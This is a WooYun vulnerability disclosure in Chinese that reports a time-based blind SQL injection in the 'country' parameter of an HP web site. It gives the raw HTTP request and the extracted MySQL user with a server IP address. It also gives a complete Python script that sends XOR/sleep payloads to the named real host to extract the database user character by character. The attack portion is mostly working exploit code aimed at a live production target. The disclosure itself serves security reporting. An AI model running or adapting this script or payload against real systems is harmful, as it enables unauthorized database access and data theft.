wybug_title: 惠普又一站点MySQL注射(附验证脚本)
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-12-24：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-02-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 惠普又一站点MySQL注射(附验证脚本) 详细说明：  注入点：
GET /hub.php?country=aaa&language=US HTTP/1.1X-Requested-With: XMLHttpRequestReferer: https://h41183.www4.hp.comCookie: PHPSESSID=jqkhjokslqfg8d4j4j0kdc8r7i1o90ehHost: h41183.www4.hp.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*
参数country可注入。MySQL time blind.   漏洞证明：  猜解user()，得到：
loki@209.166.84.121


验证python脚本：
#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print 'start to retrive MySQL user:'user = ''for i in range(1,20):    for payload in payloads:        try:            conn = httplib.HTTPSConnection('h41183.www4.hp.com', timeout=10)            rand_num = str(random.random())            s = "123'XOR(if(ascii(mid(lower(user())from(%s)for(1)))=%s,sleep(5),0))OR'bbb" % (i, ord(payload) )            conn.request(method='GET',                         url='/hub.php?country=' + urllib.quote(s),                         headers = headers)            start_time = time.time()            html_doc = conn.getresponse().read()            conn.close()            print '.',        except:            user += payload            print '\n[in progress]', user            breakprint '\n[Done]MySQL user is', user
   修复方案：  过滤   版权声明：转载请注明来源 lijiejie@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
